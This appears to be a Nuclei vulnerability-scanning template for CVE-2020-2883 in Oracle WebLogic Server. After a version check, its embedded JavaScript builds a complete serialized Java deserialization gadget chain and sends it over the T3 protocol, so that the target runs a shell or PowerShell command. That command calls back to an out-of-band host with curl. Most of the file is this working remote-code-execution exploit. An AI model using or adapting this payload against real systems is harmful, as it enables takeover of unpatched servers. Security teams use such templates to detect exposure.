flow: http(1) && javascript(1)
http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body
    regex:
    - WebLogic\s+Server\s+Version:\s+([0-9.]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_any(body, "10.3.6.0", "12.1.3.0", "12.2.1.3", "12.2.1.4")
    - contains(body, "WebLogic Server Version:")
    - status_code == 200
    internal: true
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/console/login/LoginForm.jsp'
id: CVE-2020-2883
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:oracle:weblogic_server:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-2883
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99963
    epss-score: 0.94377
  description: 'Vulnerability in the Oracle WebLogic Server product of Oracle Fusion
    Middleware (component: Core). Supported versions that are affected are 10.3.6.0.0,
    12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows
    unauthenticated attacker with network access via IIOP, T3 to compromise Oracle
    WebLogic Server. Successful attacks of this vulnerability can result in takeover
    of Oracle WebLogic Server. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity
    and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

    '
  impact: 'Unauthenticated attackers can exploit unsafe deserialization over IIOP/T3
    protocols to achieve complete takeover of Oracle WebLogic Server instances.

    '
  metadata:
    max-request: 1
    product: weblogic_server
    shodan-query: product:"oracle weblogic"
    vendor: oracle
    verified: true
  name: Oracle WebLogic Server - Remote Code Execution
  reference:
  - http://packetstormsecurity.com/files/157950/WebLogic-Server-Deserialization-Remote-Code-Execution.html
  - https://www.oracle.com/security-alerts/cpuapr2020.html
  - https://www.zerodayinitiative.com/advisories/ZDI-20-504/
  - https://www.zerodayinitiative.com/advisories/ZDI-20-570/
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/weblogic_deserialize_badattr_extcomp.rb
  - https://nvd.nist.gov/vuln/detail/CVE-2020-2883
  remediation: 'Upgrade to Oracle WebLogic Server versions that include patches for
    this vulnerability as described in the Oracle April 2020 CPU.

    '
  severity: critical
  tags: cve,cve2020,oracle,weblogic,javascript,rce,intrusive,kev,vkev,vuln
javascript:
- args:
    Host: '{{Host}}'
    Port: 7001
    oast: '{{interactsh-url}}'
  code: "const m = require('nuclei/net');\n\nconst command1 = \"/bin/sh -c curl http://\"\
    \ + oast;\nconst command2 = \"cmd.exe /c powershell.exe -nop -ep bypass -e \"\
    \ + btoa(\"curl http://\" + oast);\nconst address = Host+\":\"+Port;\nconst version\
    \ = template.version;\n\nlet conn, conn2;\n\nconn = m.Open('tcp', address);\n\
    conn2 = m.Open('tcp', address);\n\nfunction extractorCompUid(versionNo) {\n  switch\
    \ (versionNo) {\n    case '12.1.3.0.0':\n      return 'c7ad6d3a676f3c18';\n  \
    \  case '12.2.1.3.0':\n      return 'fb4ac83df1d72edc';\n    default:\n      return\
    \ 'f9b3bc58cc52cd21';\n  }\n}\n\nfunction chainedExtractorUid(versionNo) {\n \
    \ switch (versionNo) {\n    case '12.1.3.0.0':\n      return '889f81b0945d5b7f';\n\
    \    case '12.2.1.3.0':\n      return '06ee10433a4cc4b4';\n    default:\n    \
    \  return '435b250b72f63db5';\n  }\n}\n\nfunction abstractExtractorUid(versionNo)\
    \ {\n  switch (versionNo) {\n    case '12.1.3.0.0':\n      return '658195303e723821';\n\
    \    case '12.2.1.3.0':\n      return '752289ad4d460138';\n    default:\n    \
    \  return '9b1be18ed70100e5';\n  }\n}\n\nfunction reflectionExtractorUid(versionNo)\
    \ {\n  switch (versionNo) {\n    case '12.1.3.0.0':\n      return 'ee7ae995c02fb4a2';\n\
    \    case '12.2.1.3.0':\n      return '87973791b26429dd';\n    default:\n    \
    \  return '1f62f564b951b614';\n  }\n}\n\nfunction reflectExtractCount(versionNo)\
    \ {\n  return versionNo === '12.2.1.3.0' ? '3' : '2';\n}\n\nfunction changeHandle(versionNo)\
    \ {\n  return versionNo === '12.2.1.3.0' ? '007e0012' : '007e0011';\n}\n\nfunction\
    \ addSect(versionNo) {\n  return versionNo === '12.2.1.3.0' ? '4c00116d5f657874726163746f724361636865647400124c6a6176612f6c616e672f4f626a6563743b'\
    \ : '';\n}\n\nfunction addTcNull(versionNo) {\n  return versionNo === '12.2.1.3.0'\
    \ ? '70' : '';\n}\n\nfunction t3_send(payload_obj) {\n  let request_obj = '000009f3016501ffffffffffffffff000000710000ea6000000018432ec6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000001007070707070700000000c00000002000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000'\n\
    \    + payload_obj\n    + 'fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200074900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870774621000000000000000000093132372e302e312e31000b75732d6c2d627265656e73a53caff10000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff0078fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771d018140128134bf427600093132372e302e312e31a53caff1000000000078'\n\
    \n  const newLen = (parseInt(request_obj.length / 2)).toString(16).padStart(8,\
    \ '0');\n  request_obj = newLen + request_obj.slice(8);\n\n  return request_obj;\n\
    }\n\nfunction formatPayload(payloadCmd) {\n  const parts = payloadCmd.split('\
    \ ');\n  const first = parts[0] || '';\n  const second = parts[1] || '';\n  const\
    \ rest = parts.slice(2).join(' ') || '';\n\n  return [first, second, rest].map(part\
    \ => {\n    const lenHex = part.length.toString(16).padStart(4, '0');\n    const\
    \ partHex = [...part].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');\n\
    \    return '74' + lenHex + partHex;\n  }).join('');\n}\n\nfunction buildPayloadObj(payload_data)\
    \ {\n  let payload_obj = 'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72'\n\
    \    + extractorCompUid(version)\n    + '0200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72'\n\
    \    + chainedExtractorUid(version)\n    + '02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72'\n\
    \    + abstractExtractorUid(version)\n    + '0200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72'\n\
    \    + reflectionExtractorUid(version)\n    + '02000'\n    + reflectExtractCount(version)\n\
    \    + '5b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b'\n\
    \    + addSect(version)\n    + '4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000000'\n\
    \    + addTcNull(version)\n    + '7400096765744d6574686f647371007e000d000000007571'\n\
    \    + changeHandle(version)\n    + '00000002707571'\n    + changeHandle(version)\n\
    \    + '00000000'\n    + addTcNull(version)\n    + '740006696e766f6b657371007e000d000000007571'\n\
    \    + changeHandle(version)\n    + '00000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000003'\n\
    \n    // Insert payload here\n    + formatPayload(payload_data)\n\n    + addTcNull(version)\n\
    \    + '74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178';\n\
    \n  return payload_obj;\n}\n\nlet shake = '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'\n\
    \n// For linux\nconn.SendHex(shake);\nlet resp = conn.RecvString();\nExport(resp);\n\
    let linux_obj = buildPayloadObj(command1);\nlinux_payload = t3_send(linux_obj);\n\
    conn.SendHex(linux_payload);\nconn.Close();\n\n// For windows\nconn2.SendHex(shake);\n\
    let resp2 = conn2.RecvString();\nExport(resp2);\nlet windows_obj = buildPayloadObj(command2);\n\
    windows_payload = t3_send(windows_obj);\nconn2.SendHex(windows_payload);\nconn2.Close();\n"
  matchers:
  - condition: and
    dsl:
    - success == true
    - contains(response, 'HELO:')
    - contains(interactsh_protocol, 'http')
    type: dsl
  pre-condition: 'isPortOpen(Host,Port);

    '
